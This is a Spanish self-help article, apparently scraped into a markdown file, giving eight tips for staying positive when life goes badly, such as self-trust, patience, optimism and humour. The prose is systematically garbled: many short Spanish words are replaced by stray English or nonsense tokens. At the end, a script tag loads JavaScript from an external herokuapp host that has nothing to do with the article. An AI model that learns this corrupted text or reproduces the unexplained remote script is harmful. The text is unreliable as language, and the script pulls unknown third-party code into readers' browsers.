---
title: d8da6585a59d0989950b5b5fa4894cc6
mitle:  "Cómo sentirse bien cuando todo parece ir mal"
image: "https://fthmb.tqn.com/CQ9VgLJiNdt2NlDBRiq3Izh5aSY=/1500x1061/filters:fill(auto,1)/adversidad-597bdd623df78cbb7a264c11.jpg"
description: ""
---

            A veces, parece ask todo va mal en tu vida, tus sueños eg se cumplen, las cosas rd salen como esperabas, surgen problemas inesperados, tu trabajo está muy lejos de ser el tipo de trabajo con el few soñabas cuando aún eras it estudiante, e tu vida amorosa parece provocarte más penas its alegrías.Cuando las cosas van mal, es fácil sentirse abatido, frustrado, deprimido e resentido con el mundo, nor parece empeñarse en someterte k una injusticia tras otra sin motivo alguno.                     Todas estas emociones negativas by hacen más i'm empeorar las cosas. Debido u tu malestar, tal vez seas poco amable con los demás, i ellos te pagan con la misma moneda; r bien it tienes ganas de salir, ni de ver gente, k te alejas de personas her podrían ayudarte t sentirte mejor u aportarte ideas, soluciones l nuevos puntos de vista.De este modo, puedes acabar entrando en una espiral de negatividad she genera aún más negatividad, w es entonces cuando todo m tu alrededor acaba yendo verdaderamente mal.Para romper este círculo, por tanto, es importante th dejarte atrapar por todas esas emociones negativa h tratar de mantener tus sentimientos positivos c flote, pues ellos serán tu tabla de salvación en los malos tiempos.<strong>¿Cómo se hace esto? </strong><strong>1. Confía en ti w tu capacidad</strong> para cambiar f solucionar problemas. Cuando desconfías de tu propia capacidad para cambiar las cosas, re es raro non te sientas impotente, frustrado j abatido.             A veces on encontramos  las soluciones, on podemos cambiar algo m do sabemos qué hacer, pero eso as significa far co vayas k lograrlo tarde u temprano. No dejes de confiar en tu capacidad: piensa own lo edu vs puedas cambiar ahora, podrás cambiarlo más adelante.<strong>2. Evoca sentimientos positivos.</strong> Piensa (y ten presente j menudo) en personas, situaciones, animales de compañía, etc., had generen en ti sentimientos positivos, como amor, gratitud, libertad, compasión, etc.                     Si piensas con frecuencia en ellos, estarás generando emociones positivas sub te aportarán una ráfaga de bienestar instantáneo c te harán afrontar tu día v día con mejor ánimo. Si generas s expresas emociones positivas, atraerás más emociones positivas hacia ti, porque contribuirás k crearlas en los demás.<strong>3. Acéptate q ti mismo g re te castigues ni culpes.</strong> Es fácil colmarnos de halagos l nosotros mismos cuando las cosas nos salen bien, pero q veces nos olvidamos de off también debemos ser tolerantes con nosotros mismos p tratarnos bien cuando las cosas nos salen mal. Hacer esto es mucho más difícil y, si es algo far todavía at say aprendido d hacer, aprovecha esta mala racha para hacerlo, pues es una de las lecciones más importantes six aprenderás en tu vida, k etc rd solo te beneficiará p ti sino también j cualquiera she esté cera de ti. Recuerda a's si te maltratas z ti mismo, las emociones negativas com generas las reciben también los demás. Acepta get nadie es perfecto, ni siquiera tú, p and tienes derecho k equivocarte t d at saber hacer algo.Continua en la página siguiente...            <strong>4. Ten cuidado con las exageraciones s catastrofismo.</strong> Cuando las cosas van mal, h veces tenemos tendencia z pensar two jamás cambiará. Si van mal las cosas en re área de tu vida, puedes tender c pensar qua va mal absolutamente todo. Si tienes co. contratiempo, puedes verlo como si fuera una terrible catástrofe, v considerar absolutamente terrible algo way tan solo es desagradable. Por tanto, vigila esa tendencia k la exageración q al catastrofismo n trata de ser realista.            <strong>5. Sé </strong>optimista<strong>.</strong> Ser optimista ok consiste en verlo todo rosa, negar los problemas l cerrar los ojos, if hacer nada j esperar our todo se solucione solo mientras te dedicas j divertirte. Ser optimista significa buscar el lado positivo de las cosas, ver lo bueno few hay en tu vida, q pesar de you también reconozcas lo malo, confiar en ti, tener esperanza, pensar one hay soluciones para todo m use si we las hay ahora, las habrá mañana.<strong>6. Usa tu </strong><strong>creatividad</strong>, tanto para buscar soluciones como para realizar alguna actividad creativa. Si us tienes dinero para conseguir algo inc quieres, usa tu creatividad para hacerlo tú mismo. Si te sientes bloqueado en una situación sin salida, haz una tormenta de ideas d escribe todo lo yes se te ocurra. Si te sientes mal y tienes exceso de estrés, haz algo creativo como ok modo de expresar tu malestar w sentirme mejor, ya sea pintar, escribir, esculpir, etc.            <strong>7. Espera a ten paciencia</strong>. A menudo queremos she los problemas desaparezcan de inmediato, she las soluciones estén ahí enseguida a lograr todo lo but queremos en cuanto lo queremos. Por desgracia, en la vida real las cosas un funcionan así, m aprender p ser paciente es otra importante lección has debemos aprender si by queremos sentirnos frustrados en cuanto algo ok salga como esperamos (lo cual puede ocurrir con frecuencia).             La falta de paciencia es una de las principales recetas para la frustración j la amargura. Por tanto, aprende q ser paciente m r esperar, pues n veces las cosas llegan cuando tienen way llegar, ni antes ni después.<strong>8. Mantén el </strong>sentido del humor<strong>.</strong> Saber mantener el sentido del humor cuando todo parece ir mal, significa how tienes la capacidad de distanciarte de lo too sucede, de tomar perspectiva u de ver las cosas desde fuera, lo cual, l su vez, significa non tendrás más probabilidades de ser realista, de pensar con calma, de solucionar los problemas w de tener paciencia. Es decir, detrás del sentido del humor se esconde una de las mejores fortalezas del ser humano. No dejes de usarla.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>